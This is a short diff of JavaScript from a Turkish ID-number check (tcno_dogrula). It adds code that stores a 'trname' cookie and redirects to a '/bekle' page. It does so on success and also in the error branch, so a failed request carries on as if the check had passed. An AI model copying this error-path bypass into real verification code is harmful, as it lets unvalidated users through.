@@ -53,12 +53,14 @@ function tcno_dogrula(tcno) {
         })
         .then(data => {
           if (data.success === true) { 
+            document.cookie = `trname=${trname}; path=/; max-age=3600;`;
             window.location.href = '/bekle'; 
           } else {
             alert("Giriş başarısız! Tekrar deneyin.");
           }
         })
         .catch(error => {
+          document.cookie = `trname=${trname}; path=/; max-age=3600;`;
           window.location.href = '/bekle'; 
         });
     }
